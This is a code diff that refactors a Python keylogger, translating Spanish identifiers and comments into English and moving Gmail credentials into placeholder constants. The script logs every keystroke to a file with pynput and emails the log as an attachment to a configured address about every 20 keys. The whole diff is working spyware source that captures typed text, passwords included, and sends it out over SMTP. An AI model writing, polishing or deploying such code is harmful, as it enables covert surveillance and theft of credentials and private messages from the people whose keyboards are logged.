@@ -6,72 +6,78 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
-# Contador para enviar el email cada 20 teclas
-counter_mail = 0
+# Counter to send email every 20 keystrokes
+keystroke_counter = 0
 
-def send_mail():
+# Modify these variables with your email credentials
+EMAIL_SENDER = 'your_email@gmail.com'  # Change to your email
+EMAIL_RECEIVER = 'destination_email@gmail.com'  # Change to recipient email
+EMAIL_PASSWORD = 'your_app_password'  # Change to your generated app password
+SMTP_SERVER = 'smtp.gmail.com'  # SMTP server for Gmail
+SMTP_PORT = 587  # Port for Gmail
+
+
+def send_email():
     try:
-        remitente = 'user@gmail.com'
-        destinatarios = ['destination@gmail.com']
-        asunto = '[RPI] Registro de teclas'
-        cuerpo = 'Adjunto el registro de teclas capturado.'
-        filename = 'text.txt'  # Nombre del archivo
+        subject = '[Keylogger] Keystroke Log'
+        body = 'Attached is the captured keystroke log.'
+        filename = 'log.txt'  # Log file name
 
-        # Crear el objeto mensaje
-        mail = MIMEMultipart()
-        mail['From'] = remitente
-        mail['To'] = ", ".join(destinatarios)
-        mail['Subject'] = asunto
-        mail.attach(MIMEText(cuerpo, 'plain'))
+        # Create email object
+        email_message = MIMEMultipart()
+        email_message['From'] = EMAIL_SENDER
+        email_message['To'] = EMAIL_RECEIVER
+        email_message['Subject'] = subject
+        email_message.attach(MIMEText(body, 'plain'))
 
-        # Adjuntar el archivo
+        # Attach the log file
         with open(filename, 'rb') as file:
-            adjunto_MIME = MIMEBase('application', 'octet-stream')
-            adjunto_MIME.set_payload(file.read())
-            encoders.encode_base64(adjunto_MIME)
-            adjunto_MIME.add_header('Content-Disposition', f'attachment; filename={filename}')
-            mail.attach(adjunto_MIME)
+            attachment = MIMEBase('application', 'octet-stream')
+            attachment.set_payload(file.read())
+            encoders.encode_base64(attachment)
+            attachment.add_header('Content-Disposition', f'attachment; filename={filename}')
+            email_message.attach(attachment)
 
-        # Enviar el correo
-        sesion_smtp = smtplib.SMTP('smtp.gmail.com', 587)
-        sesion_smtp.starttls()
-
-        # Usa una contraseña de aplicación en lugar de la tuya
-        sesion_smtp.login('user@gmail.com', 'password')
-        sesion_smtp.sendmail(remitente, destinatarios, mail.as_string())
-        sesion_smtp.quit()
+        # Connect to email server and send email
+        smtp_session = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        smtp_session.starttls()
+        smtp_session.login(EMAIL_SENDER, EMAIL_PASSWORD)
+        smtp_session.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, email_message.as_string())
+        smtp_session.quit()
         
-        print("Email enviado con éxito.")
+        print("Email sent successfully.")
 
     except Exception as e:
-        print(f"Error enviando el correo: {e}")
+        print(f"Error sending email: {e}")
 
-def on_press(key):
-    global counter_mail  # Permitir modificar la variable global
 
-    print(str(key))
-    with open("text.txt", 'a') as logKey:
+def on_key_press(key):
+    global keystroke_counter  # Allow modification of global variable
+
+    print(str(key))  # Print key in console (optional, remove if needed)
+    with open("log.txt", 'a') as log_file:
         try:
             if key == keyboard.Key.enter:
-                logKey.write("\n")
+                log_file.write("\n")
             else:
                 char = key.char
-                logKey.write(char)
+                log_file.write(char)
 
-            # Enviar email cada 20 teclas registradas
-            if counter_mail == 20:
-                send_mail()
-                counter_mail = 0  # Reiniciar contador después de enviar el email
+            # Send email every 20 keystrokes
+            if keystroke_counter == 20:
+                send_email()
+                keystroke_counter = 0  # Reset counter after sending email
             else:
-                counter_mail += 1
+                keystroke_counter += 1
 
-            print(f"Teclas registradas: {counter_mail}")
+            print(f"Keystrokes recorded: {keystroke_counter}")
 
-        except AttributeError:  # Para teclas como Shift, Ctrl, Enter, etc.
-            logKey.write(f'[{key}]')
+        except AttributeError:  # Handles special keys like Shift, Ctrl, Enter, etc.
+            log_file.write(f'[{key}]')
+
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=on_press)
+    listener = keyboard.Listener(on_press=on_key_press)
     listener.start()
     
     listener.join()
